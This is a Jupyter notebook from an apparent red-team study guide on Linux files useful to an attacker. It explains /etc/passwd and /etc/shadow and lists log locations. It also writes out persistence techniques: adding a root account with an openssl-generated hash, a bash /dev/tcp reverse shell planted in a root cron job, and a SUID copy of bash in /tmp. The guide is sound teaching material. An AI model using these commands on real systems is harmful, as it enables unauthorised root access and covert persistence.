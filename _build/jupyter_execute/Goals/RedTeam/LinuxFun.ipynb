{
 "cells": [
  {
   "cell_type": "markdown",
   "id": "406ae0f6-f68f-469c-8da6-c1268799c15f",
   "metadata": {},
   "source": [
    "# Linux Fun\n",
    "\n",
    "So, we know our target is a Linux box, what can we do with this information? There’s a whole range of locations that could be interesting if we are looking to exploit a box. While many parallels can be drawn between this section and Windows, they are different OS' and should be understood separately.\n",
    "\n",
    "## Password locations\n",
    "The keys to the safe; but even keys need to be kept somewhere.\n",
    "\n",
    "### /etc/passwd\n",
    "While this looks like a password file, you’re only half right. In *most* modern versions the user/password file has been split in 2. The user list and details about the users are kept here.<br>\n",
    "This file is made up of individual lines, each referring to an individual user. The format doesn’t really change too much if you’re in an old or new version though. Each line is a colon (:) separated list<br>\n",
    "\n",
    "> test:x:0:0:secretaccount:/root:/bin/bash\n",
    "\n",
    "- Test: the user name of this account\n",
    "- x: the hashed password (if hashes are split off, this is normally an 'x')\n",
    "- 0: User ID, zero is reserved for root users\n",
    "- 0: Group ID, again zero is reserved for root groups\n",
    "- secretaccount: Comments about the user\n",
    "- /root: The home directory of the user\n",
    "- /bin/bash: the shell location for the user\n",
    "\n",
    "Clearly this is an example account, but you should be able to get the format from this.<br>\n",
    "Next question, how do we modify this file? Well, it’s a txt file, so however you would like :-). The issue is this file is normally root only writeable.<br>\n",
    "\n",
    "Let’s say you have done some [PriveligeEscalation](../Tools/PriveligeEscalation/PriveligeEscalation.ipynb) and can get a root exploit through. This is a great way to maintain access, just make yourself an account. Most of this is trivial, except generating the hashed password. Fortunately, Kali comes with methods for this\n",
    "\n",
    "> openssl passwd -1 -salt[your salt here] [the new password]\n",
    "\n",
    "This will generate a hash for you, based on your provide password. If you dont want to salt (or its not required), drop the -1 and -salt[]\n",
    "<hr>\n",
    "### /etc/shadow\n",
    "When the hashes were removed from /etc/passwd they showed up here. Again, this file is normally root readable only.\n",
    "<hr>\n"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "3e38e3a8-a313-418e-8e96-1cf5fac38aa7",
   "metadata": {},
   "source": [
    "## /etc/crontab\n",
    "Cron (or CronTabs / CronJobs) is the Linux equivalent of Windows' Task Scheduler. It simply launches programs based on a defined time schedule. If you can view this file there may be jobs set to run as root, and it tells you the file it executes. Who's stopping us from changing this file? No-one, that’s who. <br>\n",
    "The obvious first point is to launch a shell as this user, a reverse shell looks a lot like this\n",
    "\n",
    "> #!/bin/bash <br>\n",
    "> bash -i >& /dev/tcp/[ip]/[port] 0>&1\n",
    "\n",
    "This will launch a reverse shell back to your machine... Neat."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 1,
   "id": "e4c92188-4369-40e1-b364-035ae4379bf6",
   "metadata": {
    "tags": [
     "remove_input"
    ]
   },
   "outputs": [
    {
     "data": {
      "text/html": [
       "<video muted controls autoplay loop  width=\"452\"  height=\"332\">\n",
       " <source src=\"data:None;base64,../videos/BenderNeat.mp4\" type=\"None\">\n",
       " Your browser does not support the video tag.\n",
       " </video>"
      ],
      "text/plain": [
       "<IPython.core.display.Video object>"
      ]
     },
     "execution_count": 1,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "from IPython.display import Video\n",
    "Video(\"../videos/BenderNeat.mp4\", embed=True,html_attributes=\"muted controls autoplay loop\", width=452, height=332)\n"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "cd51c821-5538-4d43-b627-02087389605f",
   "metadata": {},
   "source": [
    "Source: https://giphy.com/gifs/8vtm3YCdxtUvjTn0U3\n",
    "<br>\n",
    "Alternatively, you may want to create a new shell somewhere you can access.\n",
    "\n",
    "> #!/bin/bash<br>\n",
    "> cp /bin/bash /tmp/rootbash<br>\n",
    "> chmod +xs /tmp/rootbash\n",
    "\n",
    "<hr>"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "2356fd26-5ce8-4d8b-9035-4ba94a8e8254",
   "metadata": {},
   "source": [
    "## Logs\n",
    "More a blue team thing, logs can also help a red teamer in the discovery phase (or when trying to pivot or priv-esc).\n",
    "\n",
    "### /var/log\n",
    "There's a few logs here that may be of interest.\n",
    "\n",
    "- auth.log : The authentication log, for seing failed loging attempts and the like.<br>\n",
    "- dpkg.log : Package management log. You can also see when a package is installed<br>\n",
    "- syslog : The logs of the system (shock!). This includes crontab event, service start/stop, log rotation etc.<br>\n",
    "- kern.log : The kernel Log. Networking changes, USB I/O, kernel changes etc.<br>\n",
    "\n",
    "<hr>"
   ]
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3 (ipykernel)",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.11.4"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 5
}